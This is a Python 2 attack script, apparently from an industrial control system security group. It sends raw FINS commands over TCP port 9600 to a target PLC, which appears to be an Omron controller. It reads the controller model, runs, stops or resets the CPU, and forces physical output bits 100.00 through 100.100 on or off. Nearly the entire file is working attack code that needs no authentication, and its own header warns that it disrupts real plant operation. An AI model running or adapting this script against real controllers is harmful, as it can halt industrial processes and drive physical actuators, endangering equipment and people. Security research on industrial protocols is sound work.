import sys, socket, binascii, time, re
#
# ICS Security Workspace(plcscan.org)
# Author:Z-0ne
# Warning:will affect the real plc system operation!!!
#
# Func:Forced set CIO data and Control CPU
#
def send_receive(s,size,strdata):
    senddata = binascii.unhexlify(strdata)
    s.send(senddata)
    try:
        resp = s.recv(1024)
        return resp
    except socket.timeout:
        print 'send commad but no respone'
    except socket.error:
        print 'err'
def validata(ip):
    ipdata = re.match(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', ip)
    if not ipdata:
        return False
    return True
def initconnect(s):
    init_address = send_receive(s,1024,'46494e530000000c000000000000000000000000')
    if len(init_address) > 23: 
        address_code = binascii.b2a_hex(init_address[23])
    else:
        print 'len err'
    getinfo = send_receive(s,1024,'46494e5300000015000000020000000080000200' + address_code + '000000ef05050100')
    print "Controller Model:" + getinfo[30:67]
def run_plc_cpu(s):
    send_receive(s,1024,'46494e5300000016000000020000000080000700000000fb00670401ffff')
def run_monitor_cpu(s):
    send_receive(s,1024,'46494e53000000160000000200000000c0000200fb00000000a604010000')
def stop_plc_cpu(s):
    send_receive(s,1024,'46494e5300000016000000020000000080000700000000fb00670402ffff')
def reset_plc_cpu(s):
    send_receive(s,1024,'46494e5300000016000000020000000080000700000000fb00670403ffff')
def loop_forced_set(s,iostate):
    if iostate == 'on':
        coil_state_code = '01'
        print 'Forced set on'
    elif iostate == 'off':
        coil_state_code = '00'
        print 'Forced set off'
    else:
        print 'Forced set on'
        coil_state_code = '01'
        #(to forced set CIO default physical output address(start at 100.00)
    for i in range(int(0),int(101)):
        print 'set default physical output at CIO out 100.%s' %(i)
        send_receive(s,1024,'46494e530000001c000000020000000080000700000000fb007e2301000100' + coil_state_code + '3000' + '64' + "%02x"%(i))
def cancel_forced_set(s):
    send_receive(s,1024,'46494e5300000014000000020000000080000700000000fb00722302')
raw_input('Warning:will affect the real system operation!!!Enter to continue!!!')
if not len(sys.argv) == 2:
    ip = raw_input('Target PLC IP:')
else:
    ip = sys.argv[1]
if not validata(ip):
    print 'err'
    sys.exit()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# no respone timeout
s.settimeout(3)
s.connect((ip,9600))
print 'connect to the plc device.....'
print 'start read device information.....'
initconnect(s)
while True:
    func = raw_input('Func(run/monitor/stop/reset/quit):')
    iostate = raw_input('Set Forced State(on/off/cancel/quit):')
    if func == 'run':
        run_plc_cpu(s)
    elif func == 'monitor':
        run_monitor_cpu(s)
    elif func == 'stop':
        stop_plc_cpu(s)
    elif func == 'reset':
        reset_plc_cpu(s)
    elif func == 'quit':
        print 'input func'
    else:
        print 'input err1'
    if iostate == 'on':
        loop_forced_set(s,iostate)
    elif iostate == 'off':
        loop_forced_set(s,iostate)
    elif iostate == 'cancel':
        cancel_forced_set(s)
    elif iostate == 'quit':
        print 'input state'
    else:
        'input err2'
    if raw_input('exit:') == 'exit':
        s.close()
        break
